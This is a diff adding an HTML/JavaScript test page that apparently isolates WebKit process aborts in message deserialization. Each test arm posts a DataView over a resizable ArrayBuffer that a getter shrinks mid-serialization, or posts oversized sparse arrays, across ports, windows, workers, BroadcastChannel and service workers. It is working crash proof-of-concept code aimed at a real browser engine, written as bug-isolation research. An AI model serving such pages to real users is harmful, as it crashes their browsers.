@@ -1,0 +1,428 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>caps10 — the family: page-reachable deserialization failures, one mechanism per arm</title>
+<body><p id="p">caps10</p>
+<script>
+// docs/90 isolation page.  docs/89 measured ONE member of the family behind
+//   RELEASE_ASSERT(vm.hasPendingTerminationException())  at  MessagePort.cpp:295
+//   (and WorkerMessagingProxy.cpp:245): a DataView with an explicit byteLength over a resizable
+// ArrayBuffer that a serializer-walked getter shrinks *after* the view was dumped.
+//
+// This page runs ONE mechanism per arm so every abort is attributable to a single variable.
+// The score is the harness, never a beacon: EXIT plus a WTFCrashWithInfo frame naming one of
+//   MessagePort.cpp:295 | LocalDOMWindow.cpp:947 | WorkerMessagingProxy.cpp:199 |
+//   WorkerMessagingProxy.cpp:245 | BroadcastChannel.cpp:256 | ServiceWorkerContainer.cpp:472
+//
+// The six dispatch sites in the drop are exactly the six RELEASE_ASSERTs on
+// `vm.hasPendingTerminationException()` that follow a `MessageEvent::create`:
+//
+//   mode=dvport      DataView(buf,0,LEN) + resizable + getter buf.resize(0), MessagePort   (docs/89 repro)
+//   mode=dvportok    same, the getter does not shrink                                        (control)
+//   mode=dvgrow      same, the getter GROWS the buffer instead                              (direction control)
+//   mode=dvwin       same over window.postMessage(msg, '*', [buf])                          (LocalDOMWindow:947)
+//   mode=dvwinopt    same over window.postMessage(msg, {transfer: [buf]})                   (options spelling)
+//   mode=dvwksend    a blob worker posts the shrink message to the document                 (MessagingProxy:199)
+//   mode=dvwkrecv    the document posts the shrink message to a blob worker                 (MessagingProxy:245)
+//   mode=arroom      {a: <sparse array of length 0x10000001>} over a port: the deserializer's
+//                    constructEmptyArray is the only fail-site that can *throw*
+//                    (throwOutOfMemoryError), but ArrayStorage allocates a fixed vector, so the
+//                    length is free — measured negative
+//   mode=arrmax      same at 0x10000000 (the IndexingHeader::maximumLength boundary)
+//   mode=arrbig      same at 1000000                                                        (size control)
+//   mode=arroomclone the 0x10000001 array through structuredClone  (Throwing mode: catchable)
+//   mode=arroomwk    the 0x10000001 array through Worker.postMessage                        (second site)
+//   mode=agg         new AggregateError([], 'm') in the message                             (ErrorInstance path)
+//   mode=tlreject    the three sender-side transfer-list rejections of SerializedScriptValue::create
+//                    (:5377 duplicate, :5381 detached, :5440 not transferable) — all throw at
+//                    postMessage, so no message exists and no deserializer runs
+//   mode=swcap       capability probe: is navigator.serviceWorker present and registrable here?
+// knobs: n=<array length override>, len=<buffer length>, reps=<n>, delay=<ms before the risky call>
+(function () {
+  'use strict';
+  function B(m, x) { try { (new Image()).src = '/ev?m=' + encodeURIComponent(String(m)) + (x ? '&' + x : ''); } catch (e) {} }
+  var Q = new URLSearchParams(location.search);
+  function K(k, d) { return Q.has(k) ? Q.get(k) : d; }
+
+  var MODE  = K('mode', 'dvport');
+  var REPS  = Math.max(1, parseInt(K('reps', '1'), 10));
+  var DELAY = Math.max(0, parseInt(K('delay', '250'), 10));
+  var LEN   = Math.max(8, parseInt(K('len', '192'), 10));
+  var BcShrink = !(K('bcplain', '0') === '1');
+  var bcPlainTag = BcShrink ? 'bcplain=0' : 'bcplain=1';
+  var SWNAME = K('swname', 'sw90b.js');   // hoisted: every SW arm needs it, and `var` inside one branch
+                                          // is undefined for the others (E5 registered `undefined` -> TypeError)
+
+  // IndexingHeader::maximumLength is 0x10000000 in this drop.
+  var NLEN = 0x10000001;
+  if (MODE === 'arrmax') NLEN = 0x10000000;
+  if (MODE === 'arrbig') NLEN = 1000000;
+  if (Q.has('n')) NLEN = parseInt(Q.get('n'), 10);
+
+  // the shrink direction for the DataView arms: resize(0) by default
+  var GROW = (MODE === 'dvgrow');
+  // NB: dvgrow must NOT take the shrink branch — the first build tested `/^dv/` only, so its "grow"
+  // arm called resize(0) and reproduced the abort instead of controlling for it (gx2=0 in A3).
+  var SHRINK = /^dv/.test(MODE) && MODE !== 'dvportok' && MODE !== 'dvgrow';   // dvclone shrinks too
+
+  B('cap', 'mode=' + MODE + '&n=' + NLEN + '&len=' + LEN + '&reps=' + REPS + '&delay=' + DELAY +
+    '&resize=' + (typeof ArrayBuffer.prototype.resize) + '&mc=' + (typeof MessageChannel) +
+    '&wk=' + (typeof Worker) + '&sc=' + (typeof structuredClone) + '&agg=' + (typeof AggregateError) +
+    '&sw=' + (typeof navigator.serviceWorker) + '&pm3=' + (window.postMessage.length));
+
+  // ---------------------------------------------------------------- workers
+  var wrk = null, wrk2 = null;
+  function mkWorker(src, onmsg, onerr) {
+    var w = null;
+    try { w = new Worker(URL.createObjectURL(new Blob([src], { type: 'text/javascript' }))); }
+    catch (e) { B('wkfail', 'e=' + e.name); return null; }
+    if (onmsg) w.onmessage = function (e) { onmsg(e.data); };
+    if (onerr) w.onerror = function (e) { onerr(e); };
+    return w;
+  }
+  // echo worker (for the array arm)
+  var ECHO = 'onmessage=function(e){var r={n:e.data&&e.data.n};' +
+    'try{var a=e.data&&e.data.a;r.al=a?(a.length===undefined?-1:a.length):-2;' +
+    'var v=e.data&&e.data.v;if(v){r.vl=v.length;r.vb=v.byteLength;}}catch(x){r.err=x.name;}' +
+    'try{postMessage(r);}catch(x){}};';
+  // the shrink message, built inside a worker and posted to the document
+  var SHRINKER = 'onmessage=function(e){try{' +
+    'var n=(e.data&&e.data.len)||192;' +
+    'var buf=new ArrayBuffer(n,{maxByteLength:n});' +
+    'var dv=new DataView(buf,0,n);' +
+    'var msg={c:1,v:dv};' +
+    'Object.defineProperty(msg,"g",{enumerable:true,configurable:true,get:function(){buf.resize(0);return 1;}});' +
+    'postMessage(msg,[buf]);' +
+    '}catch(x){try{postMessage({err:x.name});}catch(y){}}};';
+  // the receiving worker for dvwkrecv: report what arrived
+  var RECVW = 'onmessage=function(e){var r={n:e.data&&e.data.n};' +
+    'try{var v=e.data&&e.data.v;if(v){r.vl=v.length;r.vb=v.byteLength;r.bb=v.buffer.byteLength;}' +
+    'r.ge=(e.data&&e.data.g===1);}catch(x){r.err=x.name;}try{postMessage(r);}catch(x){}};';
+
+  var rep = 0, done = 0;
+  function next() {
+    if (done >= REPS) { B('done', 'n=' + done + '&mode=' + MODE); return; }
+    setTimeout(run, 30);
+  }
+
+  // ---------------------------------------------------------------- DataView message
+  var gx = -1, gx2 = -1, ger = '', gn = 0;
+  function makeDvMsg(buf, n) {
+    var view = new DataView(buf, 0, n);
+    var msg = { c: rep, v: view };
+    Object.defineProperty(msg, 'g', { enumerable: true, configurable: true, get: function () {
+      gn++; gx = buf.byteLength;
+      try { if (SHRINK) { buf.resize(0); gx2 = buf.byteLength; } else if (GROW) { buf.resize(2 * LEN); gx2 = buf.byteLength; } }
+      catch (e) { ger = e.name; }
+      return 1;
+    } });
+    return msg;
+  }
+  function dvBase() {
+    return 'mode=' + MODE + '&len=' + LEN + '&gx=' + gx + '&gx2=' + gx2 + '&gerr=' + (ger || '-') + '&gn=' + gn;
+  }
+
+  function run() {
+    var tag = 'R' + rep;
+    var t0 = 0, ms = -1;
+
+    // ============================================================ non-DataView arms
+    if (MODE === 'tlreject') {
+      var buf1 = new ArrayBuffer(64), e1 = '', e2 = '', e3 = '';
+      try { var c0 = new MessageChannel(); c0.port1.postMessage({ b: buf1 }, [buf1, buf1]); e1 = 'nothrow'; }
+      catch (e) { e1 = e.name; }
+      var buf2 = new ArrayBuffer(64); try { structuredClone(buf2, { transfer: [buf2] }); } catch (e) {}
+      try { var c1 = new MessageChannel(); c1.port1.postMessage({ b: buf2 }, [buf2]); e2 = 'nothrow'; }
+      catch (e) { e2 = e.name; }
+      try { var c2 = new MessageChannel(); c2.port1.postMessage({ o: {} }, [{}]); e3 = 'nothrow'; }
+      catch (e) { e3 = e.name; }
+      B('wx' + tag, 'mode=tlreject&dup=' + e1 + '&detached=' + e2 + '&plain=' + e3);
+      done++; rep++; return setTimeout(next, 200);
+    }
+
+    if (MODE === 'agg') {
+      var ch5 = new MessageChannel();
+      var em = { c: rep, e: new AggregateError([1, 2], 'boom') };
+      ch5.port2.onmessage = function (ev) {
+        var d = ev.data, x = d && d.e;
+        B('rx' + tag, 'mode=agg&name=' + (x && x.name) + '&msg=' + (x && x.message) +
+          '&nerr=' + (x && x.errors ? x.errors.length : -1) + '&str=' + encodeURIComponent(String(x).slice(0, 40)));
+        done++; rep++; setTimeout(next, 200);
+      };
+      try { ch5.port1.postMessage(em); B('wx' + tag, 'mode=agg&post=1'); }
+      catch (e) { B('wx' + tag, 'mode=agg&posterr=' + e.name); }
+      setTimeout(function () { B('wx' + tag, 'mode=agg&timeout=1'); }, 800);
+      return;
+    }
+
+    if (MODE === 'swres') {
+      // Does the SW->client path keep a transferred buffer resizable?  The dvsw arm arrived with
+      // v === null (no exception), which is what DataView::wrappedAs does when the buffer is NOT
+      // resizable — this arm measures the buffer shape directly.
+      var sw2 = navigator.serviceWorker, o2 = 'mode=swres&sw=' + (typeof sw2);
+      var PROBE = parseInt(K('probe', '1'), 10);
+      navigator.serviceWorker.onmessage = function (ev) {
+        var d = ev.data || {};
+        var b = d.b;
+        B('rx' + tag, o2 + '&probe=' + (d.probe || 0) + '&probe2=' + (d.probe2 || 0) + '&mx=' + (b ? (b.maxByteLength === undefined ? 'undefined' : b.maxByteLength) : '-') +
+          '&bl=' + (b ? b.byteLength : -1) + '&beforemx=' + d.mx + '&beforebl=' + d.bl + '&posterr=' + (d.posterr || '-'));
+      };
+      try { sw2.register(SWNAME, { scope: './' }).then(function () { return navigator.serviceWorker.ready; })
+        .then(function (rr) { if (!rr.active) { B('wx' + tag, o2 + '&noactive=1'); return; }
+          navigator.serviceWorker.controller ? null : null;
+          rr.active.postMessage(PROBE === 2 ? { probe2: 1 } : { probe: 1 }); B('wx' + tag, o2 + '&posting=1&probe=' + PROBE); },
+          function (e) { B('wx' + tag, o2 + '&regerr=' + (e && e.name)); });
+      } catch (e) { B('wx' + tag, o2 + '&cerr=' + e.name); }
+      setTimeout(function () { B('wx' + tag, o2 + '&timeout=1'); }, 6000);
+      return;
+    }
+
+    if (MODE === 'swcap' || MODE === 'dvsw') {
+      var sw = navigator.serviceWorker, out = 'mode=' + MODE + '&sw=' + (typeof sw);
+      try {
+        if (sw) {
+          out += '&ctrl=' + (sw.controller ? 1 : 0) + '&rdy=' + (typeof sw.ready);
+          navigator.serviceWorker.onmessageerror = function () { B('rxerr' + tag, out + '&messageerror=1'); };
+          navigator.serviceWorker.onmessage = function (ev) {
+            var d = ev.data, v = d && d.v;
+            B('rx' + tag, out + '&fromsw=1&rxv=' + (v ? 1 : 0) + '&vb=' + (v ? v.byteLength : -1) +
+              '&bb=' + (v && v.buffer ? v.buffer.byteLength : -1) +
+              '&keys=' + (d ? Object.keys(d).join(',') : '-') + '&c=' + (d && d.c) + '&go=' + (d && d.go) +
+              '&tv=' + (typeof (d && d.v)) + '&tn=' + (d && d.v === null ? 1 : 0) + '&tu=' + (d && d.v === undefined ? 1 : 0));
+          };
+          var asked = false;
+          function ask(w) {
+            if (asked) return; asked = true;
+            B('wx' + tag, out + '&active=1&posting=1');
+            try { w.postMessage({ go: 1, len: LEN }); } catch (e) { B('wx' + tag, out + '&pmerr=' + e.name); }
+          }
+          sw.register(SWNAME, { scope: './' }).then(function (r) {
+            B('wx' + tag, out + '&reg=' + (r ? (r.active ? 'active' : (r.installing ? 'installing' : (r.waiting ? 'waiting' : 'pending'))) : 'null'));
+            if (MODE === 'swcap') { done++; rep++; return setTimeout(next, 500); }
+            return navigator.serviceWorker.ready.then(function (rr) {
+              B('wx' + tag, out + '&ready=1&act=' + (rr.active ? 1 : 0));
+              if (rr.active) ask(rr.active);
+              else { done++; rep++; setTimeout(next, 500); }
+            });
+          }, function (e) { B('wx' + tag, out + '&regerr=' + (e && e.name)); done++; rep++; setTimeout(next, 500); });
+        } else B('wx' + tag, out);
+      } catch (e) { B('wx' + tag, out + '&cerr=' + e.name); }
+      setTimeout(function () { B('wx' + tag, out + '&timeout=1'); }, 6000);
+      return;
+    }
+
+    if (MODE === 'bcshrink') {
+      // BroadcastChannel has no transfer list in this drop (dom/BroadcastChannel.idl:
+      // postMessage(any message)), so the buffer is written in-line at the view's dump point and the
+      // payload and contents cannot disagree.  This arm measures that: same view, same shrink.
+      var bc = null, gotb = false;
+      try { bc = new BroadcastChannel('c90'); } catch (e) { B('wx' + tag, 'mode=bcshrink&bcerr=' + e.name); done++; return setTimeout(next, 200); }
+      bc.onmessageerror = function (ev) {
+        B('rxerr' + tag, 'mode=bcshrink&messageerror=1&dnull=' + (ev.data === null ? 1 : 0));
+        try { bc.close(); } catch (e) {}
+        done++; rep++; setTimeout(next, 200);
+      };
+      bc.onmessage = function (ev) {
+        gotb = true;
+        var d = ev.data, v = d && d.v;
+        B('rx' + tag, 'mode=bcshrink&rxv=' + (v ? 1 : 0) + '&vb=' + (v ? v.byteLength : -1) +
+          '&bb=' + (v && v.buffer ? v.buffer.byteLength : -1) + '&mx=' + (v && v.buffer && v.buffer.maxByteLength !== undefined ? v.buffer.maxByteLength : -1));
+        try { bc.close(); } catch (e) {}
+        done++; rep++; setTimeout(next, 200);
+      };
+      var bufB = new ArrayBuffer(LEN, { maxByteLength: LEN });
+      var dvB = new DataView(bufB, 0, LEN);
+      var msgB = { c: rep, v: dvB };
+      var gB = -1;
+      Object.defineProperty(msgB, 'g', { enumerable: true, configurable: true, get: function () {
+        gB = bufB.byteLength; try { bufB.resize(0); } catch (e) {} return 1; } });
+      try { bc.postMessage(msgB); B('wx' + tag, 'mode=bcshrink&post=1&gx=' + gB + '&tx=' + bufB.byteLength); }
+      catch (e) { B('wx' + tag, 'mode=bcshrink&posterr=' + e.name); }
+      setTimeout(function () { if (!gotb) B('wx' + tag, 'mode=bcshrink&timeout=1'); }, 3000);
+      return;
+    }
+
+    if (MODE === 'bcshrink2') {
+      // BroadcastChannel: post on one object, receive on a SECOND object with the same name — WebKit's
+      // registry does not deliver to the posting channel (measured: bcshrink's own-object post never
+      // fired message or messageerror).  Same view, same shrink, and `bcplain` is the no-shrink twin.
+      var bcTx = new BroadcastChannel('c91'), bcRx = new BroadcastChannel('c91'), got2 = false;
+      function bcdone(what) { if (got2) return; got2 = true; try { bcTx.close(); bcRx.close(); } catch (e) {} }
+      bcRx.onmessage = function (ev) {
+        var d = ev.data, v = d && d.v;
+        B('rx' + tag, 'mode=bcshrink2&' + bcPlainTag + '&rxv=' + (v ? 1 : 0) + '&vb=' + (v ? v.byteLength : -1) +
+          '&bb=' + (v && v.buffer ? v.buffer.byteLength : -1) + '&mx=' + (v && v.buffer && v.buffer.maxByteLength !== undefined ? v.buffer.maxByteLength : -1) + '&gv=' + (d && d.g));
+        bcdone(); done++; rep++; setTimeout(next, 200);
+      };
+      bcRx.onmessageerror = function () {
+        B('rxerr' + tag, 'mode=bcshrink2&' + bcPlainTag + '&messageerror=1');
+        bcdone(); done++; rep++; setTimeout(next, 200);
+      };
+      var bufC = new ArrayBuffer(LEN, { maxByteLength: 2 * LEN });
+      var dvC = new DataView(bufC, 0, LEN);
+      var msgC = { c: rep, v: dvC };
+      var gC = -1;
+      Object.defineProperty(msgC, 'g', { enumerable: true, configurable: true, get: function () {
+        gC = bufC.byteLength; if (BcShrink) { try { bufC.resize(0); } catch (e) {} } return 1; } });
+      try { bcTx.postMessage(msgC); B('wx' + tag, 'mode=bcshrink2&' + bcPlainTag + '&post=1&gx=' + gC + '&tx=' + bufC.byteLength); }
+      catch (e) { B('wx' + tag, 'mode=bcshrink2&' + bcPlainTag + '&posterr=' + e.name); }
+      setTimeout(function () { if (!got2) B('wx' + tag, 'mode=bcshrink2&' + bcPlainTag + '&timeout=1'); }, 3000);
+      return;
+    }
+
+    if (MODE === 'mxprobe') {
+      // page-local twin of sw90d's probe2: a resizable buffer shrunk to 0 and transferred over a
+      // MessagePort — is it still resizable at the receiver?  This is the variable that decides
+      // whether DataView::wrappedAs verifies (-> jsNull, no throw) or skips (-> JSDataView::create
+      // throws, process aborts).
+      var b0 = new ArrayBuffer(192, { maxByteLength: 192 });
+      b0.resize(0);
+      var chm = new MessageChannel();
+      chm.port2.onmessage = function (ev) {
+        var b = ev.data && ev.data.b;
+        B('rx' + tag, 'mode=mxprobe&mx=' + (b ? (b.maxByteLength === undefined ? 'u' : b.maxByteLength) : '-') +
+          '&bl=' + (b ? b.byteLength : -1) + '&tmx=' + ev.data.tmx + '&tbl=' + ev.data.tbl);
+        done++; rep++; setTimeout(next, 200);
+      };
+      try {
+        chm.port1.postMessage({ b: b0, tmx: b0.maxByteLength, tbl: b0.byteLength }, [b0]);
+        B('wx' + tag, 'mode=mxprobe&post=1&postbl=' + b0.byteLength);
+      } catch (e) { B('wx' + tag, 'mode=mxprobe&posterr=' + e.name); }
+      setTimeout(function () { B('wx' + tag, 'mode=mxprobe&timeout=1'); }, 3000);
+      return;
+    }
+
+    if (MODE === 'arroom' || MODE === 'arrmax' || MODE === 'arrbig' || MODE === 'arroomclone' || MODE === 'arroomwk') {
+      var a = []; a.length = NLEN;
+      var msgA = { c: rep, a: a };
+      var baseA = 'mode=' + MODE + '&n=' + NLEN + '&al0=' + a.length;
+      if (MODE === 'arroomclone') {
+        var out2 = null, ce = '', cn = -1;
+        t0 = performance.now();
+        try { out2 = structuredClone(msgA); } catch (e) { ce = e.name; }
+        ms = Math.round(performance.now() - t0);
+        if (out2 && out2.a) cn = out2.a.length;
+        B('wx' + tag, baseA + '&ms=' + ms + '&clerr=' + (ce || '-') + '&cln=' + cn);
+        done++; rep++; return setTimeout(next, 300);
+      }
+      if (MODE === 'arroomwk') {
+        if (!wrk) wrk = mkWorker(ECHO, function (d) {
+          B('rx' + tag, baseA + '&wk=1&al=' + d.al + '&err=' + (d.err || '-'));
+          done++; rep++; setTimeout(next, 300);
+        });
+        if (!wrk) { done++; return setTimeout(next, 300); }
+        t0 = performance.now();
+        try { wrk.postMessage(msgA); ms = Math.round(performance.now() - t0); B('wx' + tag, baseA + '&ms=' + ms + '&post=1'); }
+        catch (e) { ms = Math.round(performance.now() - t0); B('wx' + tag, baseA + '&ms=' + ms + '&posterr=' + e.name); }
+        setTimeout(function () { B('wx' + tag, baseA + '&timeout=1'); }, 3000);
+        return;
+      }
+      var chA = new MessageChannel();
+      chA.port2.onmessage = function (ev) {
+        var d = ev.data, av = d && d.a;
+        B('rx' + tag, baseA + '&al=' + (av ? av.length : -2) + '&cn=' + (d && d.c));
+        done++; rep++; setTimeout(next, 200);
+      };
+      t0 = performance.now();
+      try { chA.port1.postMessage(msgA); ms = Math.round(performance.now() - t0); B('wx' + tag, baseA + '&ms=' + ms + '&post=1'); }
+      catch (e) { ms = Math.round(performance.now() - t0); B('wx' + tag, baseA + '&ms=' + ms + '&posterr=' + e.name); }
+      setTimeout(function () { B('wx' + tag, baseA + '&timeout=1&ms=' + ms); }, 3000);
+      return;
+    }
+
+    // ============================================================ DataView arms
+    var buf;
+    try { buf = new ArrayBuffer(LEN, { maxByteLength: GROW ? 2 * LEN : LEN }); }
+    catch (e) { B('wx' + tag, 'mkerr=' + e.name); return done++; }
+    var msg;
+    try { msg = makeDvMsg(buf, LEN); }
+    catch (e) { B('wx' + tag, 'vwerr=' + e.name); return done++; }
+
+    if (MODE === 'dvwin' || MODE === 'dvwinopt') {
+      var got = false;
+      window.onmessage = function (ev) {
+        if (got) return; got = true;
+        var d = ev.data, v = d && d.v;
+        B('rx' + tag, dvBase() + '&rxv=' + (v ? 1 : 0) + '&vb=' + (v ? v.byteLength : -1) +
+          '&bb=' + (v && v.buffer ? v.buffer.byteLength : -1) + '&gv=' + (d && d.g));
+        done++; rep++; setTimeout(next, 200);
+      };
+      t0 = performance.now();
+      try {
+        if (MODE === 'dvwinopt') window.postMessage(msg, { transfer: [buf] });
+        else window.postMessage(msg, '*', [buf]);
+        ms = Math.round(performance.now() - t0);
+        B('wx' + tag, dvBase() + '&ms=' + ms + '&post=1&tx=' + buf.byteLength);
+      } catch (e) {
+        ms = Math.round(performance.now() - t0);
+        B('wx' + tag, dvBase() + '&ms=' + ms + '&txe=' + e.name + '&tx=' + buf.byteLength);
+        done++; rep++; return setTimeout(next, 200);
+      }
+      setTimeout(function () { if (!got) B('wx' + tag, dvBase() + '&timeout=1'); }, 3000);
+      return;
+    }
+
+    if (MODE === 'dvwksend') {
+      // the worker builds the message and posts it to the document: WorkerMessagingProxy::postMessageToWorkerObject
+      var gotw = false;
+      if (!wrk2) wrk2 = mkWorker(SHRINKER, function (d) {
+        if (d && d.err) { B('wkbuild', 'err=' + d.err); return; }
+        B('rx' + tag, 'mode=dvwksend&fromworker=1&v=' + (d && d.v ? 1 : 0) + '&vb=' + (d && d.v ? d.v.byteLength : -1));
+        done++; rep++; setTimeout(next, 200);
+      }, function (e) { B('wkerr', 'm=' + encodeURIComponent(String(e && e.message))); });
+      if (!wrk2) { done++; return setTimeout(next, 300); }
+      wrk2.postMessage({ len: LEN });
+      B('wx' + tag, dvBase() + '&sent=1');
+      setTimeout(function () { if (!gotw) B('wx' + tag, dvBase() + '&timeout=1'); }, 3000);
+      return;
+    }
+
+    if (MODE === 'dvwkrecv') {
+      var gotr = false;
+      if (!wrk) wrk = mkWorker(RECVW, function (d) {
+        if (gotr) return; gotr = true;
+        B('rx' + tag, dvBase() + '&recv=wk&vl=' + d.vl + '&vb=' + d.vb + '&bb=' + d.bb + '&ge=' + d.ge + '&err=' + (d.err || '-'));
+        done++; rep++; setTimeout(next, 200);
+      });
+      if (!wrk) { done++; return setTimeout(next, 300); }
+      t0 = performance.now();
+      try { wrk.postMessage(msg, [buf]); ms = Math.round(performance.now() - t0); B('wx' + tag, dvBase() + '&ms=' + ms + '&post=1&tx=' + buf.byteLength); }
+      catch (e) { ms = Math.round(performance.now() - t0); B('wx' + tag, dvBase() + '&ms=' + ms + '&txe=' + e.name); }
+      setTimeout(function () { if (!gotr) B('wx' + tag, dvBase() + '&timeout=1'); }, 3000);
+      return;
+    }
+
+    if (MODE === 'dvclone') {
+      var out3 = null, ce2 = '', cm = '';
+      t0 = performance.now();
+      try { out3 = structuredClone(msg, { transfer: [buf] }); }
+      catch (e) { ce2 = e.name; cm = String(e.message || ''); }
+      ms = Math.round(performance.now() - t0);
+      B('wx' + tag, dvBase() + '&ms=' + ms + '&clerr=' + (ce2 || '-') + '&clmsg=' + encodeURIComponent(cm) +
+        '&clv=' + (out3 && out3.v ? 1 : 0) + '&tx=' + buf.byteLength);
+      done++; rep++; return setTimeout(next, 200);
+    }
+
+    // default: MessagePort in the same document
+    var ch = new MessageChannel();
+    var fin = false;
+    ch.port2.onmessage = function (ev) {
+      if (fin) return; fin = true;
+      var d = ev.data, v = d && d.v;
+      B('rx' + tag, dvBase() + '&rxv=' + (v ? 1 : 0) + '&vb=' + (v ? v.byteLength : -1) +
+        '&bb=' + (v && v.buffer ? v.buffer.byteLength : -1) + '&gv=' + (d && d.g));
+      done++; rep++; setTimeout(next, 200);
+    };
+    t0 = performance.now();
+    try { ch.port1.postMessage(msg, [buf]); ms = Math.round(performance.now() - t0); }
+    catch (e) {
+      B('wx' + tag, dvBase() + '&ms=' + Math.round(performance.now() - t0) + '&txe=' + e.name + '&tx=' + buf.byteLength);
+      done++; rep++; return setTimeout(next, 200);
+    }
+    B('wx' + tag, dvBase() + '&ms=' + ms + '&post=1&tx=' + buf.byteLength);
+    setTimeout(function () { if (!fin) B('wx' + tag, dvBase() + '&timeout=1'); }, 3000);
+  }
+
+  setTimeout(run, DELAY);
+})();
+</script>
+</body>
